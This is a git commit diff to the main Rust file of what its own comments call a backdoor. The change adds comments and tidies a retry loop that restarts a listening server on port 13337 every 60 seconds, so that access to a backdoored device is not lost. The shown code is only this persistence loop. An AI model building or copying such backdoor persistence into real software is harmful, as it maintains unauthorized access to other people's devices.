59823c2ea04dc80526cc50a4344a3284a97f62c1
talbor49 <talbor49@gmail.com>
2020-01-24 17:12:53 +0200

    Add main comments

--- src/main.rs
+++ src/main.rs
@@ -7,7 +7,10 @@ const RETRY_INTERVAL_SECONDS: u64 = 60;
 const PORT: u32 = 13337;
 
 fn main() {
+    // Using loop here because in case we fail to create the server, we should try again.
+    // This is because we don't want to lose access to a device we have a backdoor on.
     loop {
+        // Blocking until server will die.
         match communication::server::run_server(PORT) {
             Ok(_) => (),
             Err(e) => {
@@ -17,7 +20,6 @@ fn main() {
                 );
             }
         }
-        let minute = time::Duration::from_secs(RETRY_INTERVAL_SECONDS);
-        thread::sleep(minute);
+        thread::sleep(time::Duration::from_secs(RETRY_INTERVAL_SECONDS));
     }
 }
